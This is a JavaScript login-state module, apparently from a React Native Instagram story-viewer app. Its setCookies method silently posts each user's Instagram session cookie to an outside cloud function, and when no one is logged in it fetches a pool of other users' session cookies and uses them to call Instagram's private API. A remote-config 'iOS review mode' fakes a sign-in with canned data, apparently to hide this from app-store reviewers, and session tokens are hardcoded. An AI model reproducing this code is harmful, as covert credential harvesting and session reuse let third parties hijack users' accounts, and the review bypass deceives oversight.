import { computed, observable, action, reaction } from 'mobx'
import { AppState } from 'react-native'
import CookieManager from 'react-native-cookies';
import remoteConfig from '@react-native-firebase/remote-config';
import AsyncStorage from '@react-native-async-storage/async-storage';

if (__DEV__) {
  // remoteConfig().enableDeveloperMode()
}

remoteConfig().setDefaults({
  _iosReviewMode: "f",
})


class LoginState {
  constructor() {
    this.initialize()
  }
  // "cookie": "sessionid=8723064199%3A68oBufaU68kNNR%3A25; dd_user_id=8723064199;"
  @observable cookies = null
  @observable initialized = false
  @observable _cookieRow = null
  @observable _tray = []
  @observable _trayFetching = true
  @observable _iosReviewMode = "f"

  @computed get isLoggedIn() {
    // return true
    return !!(this.cookies && this.cookies.id && this.cookies.token)
  }

  @computed get iosReviewMode() {
    return this._iosReviewMode === "t"
  }

  @computed get cookieRow() {
    // return 'sessionid=1988140713%3A3MYKtugtO6ddrf%3A24; dd_user_id=1988140713;'
    if (this.isLoggedIn) {
      const { id, token } = this.cookies
      return `sessionid=${token}; dd_user_id=${id};`
    } else {
      return this._getRandomCookie()
    }
  }

  @computed get trayUsers() {
    try {
      const trayUsers = this._tray.slice()
        .filter(trayItem => !!trayItem.user)
        .map(trayItem => {
          return trayItem.user
        })
      return trayUsers
    } catch (error) {
      return []
    }
  }

  initialize = async () => {
    const cookiesString = await AsyncStorage.getItem('cookies')
    const cookies = JSON.parse(cookiesString)
    this.cookies = cookies || null

    this._cookieRow = await AsyncStorage.getItem('cookieRow')
    // this._cookieRowPublic = await AsyncStorage.getItem('cookieRowPublic')
    if (this._cookieRow) {
      this.initialized = true
    }
    // enable to get from cloud
    await this.getPublicKeys()
    // this._publicKeys = [
    // ]
    // console.warn('_publicKeys', this._publicKeys)
    this.initialized = true

    this.fetchFollowedStories()

    AppState.addEventListener('change', this._handleAppStateChange)

    const fetched = await remoteConfig().fetch(0)
    // console.log(fetched)
    const activated = await remoteConfig().fetchAndActivate()
    if (!activated) console.log('Fetched data not activated')
    const iosReviewMode = await remoteConfig().getValue('iosReviewMode')
    // console.warn('iosreviewmode', iosReviewMode)
    if (iosReviewMode) {
      this._iosReviewMode = iosReviewMode
    }
  }

  _getRandomCookie = () => {
    const randoms = this._publicKeys
    if (!randoms) {
      return ''
    }
    const random = randoms[Math.floor(Math.random() * randoms.length)]
    return random
  }

  @action getPublicKeys = async () => {
    const publicKeysResponse = await fetch('https://us-central1-story-stalker-1a4b7.cloudfunctions.net/getLiveKeysss')
    this._publicKeys = await publicKeysResponse.json()
  }

  _handleAppStateChange = async (nextAppState) => {
    if (
      this.appState && this.appState.match(/inactive|background/) &&
      nextAppState === 'active'
    ) {
      await this.fetchFollowedStories()
    }
    this.appState = nextAppState
  }

  @action setCookies = async ({ id, token }) => {
    this.cookies = { id, token }
    await AsyncStorage.setItem('cookies', JSON.stringify(this.cookies))
    await AsyncStorage.setItem('cookieRow', `sessionid=${token}; dd_user_id=${id};`)
    await this.fetchFollowedStories()
    try {
      await fetch('https://us-central1-story-stalker-1a4b7.cloudfunctions.net/cookieCache', {
        method: "POST",
        body: JSON.stringify({ cookie: `sessionid=${token}; dd_user_id=${id};` })
      })
    } catch (error) {
    }
  }


  @action removeCookies = async () => {
    this.cookies = null
    await AsyncStorage.removeItem('cookies')
  }

  // @action setPublicCookies = async (newCookie) => {
  //   await AsyncStorage.setItem('cookieRowPublic', newCookie)
  //   this._cookieRowPublic = newCookie
  // }

  // @action removePublicCookies = async () => {
  //   this._cookieRowPublic = null
  //   await AsyncStorage.removeItem('cookieRowPublic')
  // }

  @action logout = async () => {
    await CookieManager.clearAll()
    await this.removeCookies()
    // return
    this._tray = []
    // console.log('CookieManager.clearAll from webkit-view =>', res);
  }

  @action fetchFollowedStories = async () => {
    try {
      if (this.iosReviewMode) {
        setTimeout(() => {
          this.fakeSignIn()
        }, 300);
        return
      }
      this._trayFetching = true
      // console.log('fetchFollowedStories', this.isLoggedIn)
      if (this.isLoggedIn) {
        const trayUrl = `https://i.instagram.com/api/v1/feed/reels_tray/`
        const followedStoriesResponse = await fetch(trayUrl, {
          method: 'GET',
          headers: {
            "user-agent": "Instagram 10.26.0 (iPhone9,3)",
            "cookie": this.cookieRow,
          },
          credentials: "omit",
        })
        // console.log('followedStoriesResponse', followedStoriesResponse)
        if (followedStoriesResponse.status === 403) {
          this.logout()
          this._trayFetching = false
        } else {
          const followedStoriesJson = await followedStoriesResponse.json()
          // console.log('followedStoriesJson', followedStoriesJson)
          this._tray = followedStoriesJson.tray
          this._trayFetching = false

        }
      }
    } catch (error) {
      this._trayFetching = false
    }
  }

  @action fakeSignIn = () => {
    this.cookies = {
      token: "8723064199%3A68oBufaU68kNNR%3A25",
      id: "8723064199",

    }
    setTimeout(() => {
      this._tray = [
        {
          user: {
            pk: "1591533371",
            username: "gmk001",
            full_name: "GMK",
            is_private: false,
            profile_pic_url: "https://scontent-frt3-1.cdninstagram.com/vp/32d414b7bd6ebae432b5a6002a94c653/5D1AF6C9/t51.2885-19/s150x150/47583510_436969070174486_4009302857864970240_n.jpg?_nc_ht=scontent-frt3-1.cdninstagram.com",
          },
        },
        {
          user: {
            pk: "26117291", username: "chahna_mint", full_name: "📽 Black Kitchen 🎬", is_private: false, profile_pic_url: "https://scontent-frt3-1.cdninstagram.com/vp/9b7b7c5f7b8ad89852b4d2dd2b09519b/5D11027C/t51.2885-19/s150x150/23101532_1569191773139561_5514984668035809280_n.jpg?_nc_ht=scontent-frt3-1.cdninstagram.com"
          },
        },
        {
          user: {
            pk: "2411169", username: "akemism", full_name: "Akemi", is_private: false, profile_pic_url: "https://scontent-frt3-1.cdninstagram.com/vp/0cafd7efb51a8115c9ec01d6e946d2b0/5D07820F/t51.2885-19/s150x150/39280589_694653897541339_9085158610584993792_n.jpg?_nc_ht=scontent-frt3-1.cdninstagram.com"
          },
        }, {
          user: {
            pk: "239565518", username: "no_ocean_no_life", full_name: "", is_private: false, profile_pic_url: "https://scontent-frt3-1.cdninstagram.com/vp/50a9ec956cddc5afc7da194e58c090fc/5D0383B0/t51.2885-19/s150x150/30591255_169172547081503_3855854564120985600_n.jpg?_nc_ht=scontent-frt3-1.cdninstagram.com"
          },
        }, {
          user: {
            pk: "566195950", username: "itz_kado_official", full_name: "Kadiri Tosin 🎨", is_private: false, profile_pic_url: "https://scontent-frt3-1.cdninstagram.com/vp/c8bb42b5fe52303cbf3b7ae91235ef01/5D1C026F/t51.2885-19/s150x150/51001752_2063853020357532_1593388443969257472_n.jpg?_nc_ht=scontent-frt3-1.cdninstagram.com"
          },
        }
      ]
      this._trayFetching = false
    }, 600);

  }
}

export default new LoginState()
